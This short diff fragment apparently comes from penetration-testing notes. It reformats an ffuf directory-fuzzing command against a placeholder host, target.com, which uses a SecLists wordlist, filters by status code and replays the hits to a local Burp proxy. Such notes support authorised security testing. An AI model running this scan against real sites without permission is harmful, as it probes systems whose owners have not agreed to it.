 
 # Useful pattern: run fast scan, review only hits in Burp
-ffuf -u http://target.com/FUZZ \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -mc 200,301,302,403 -ac \
-  -replay-proxy http://127.0.0.1:8080
+ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -ac -replay-proxy http://127.0.0.1:8080
 ```
 
 ---
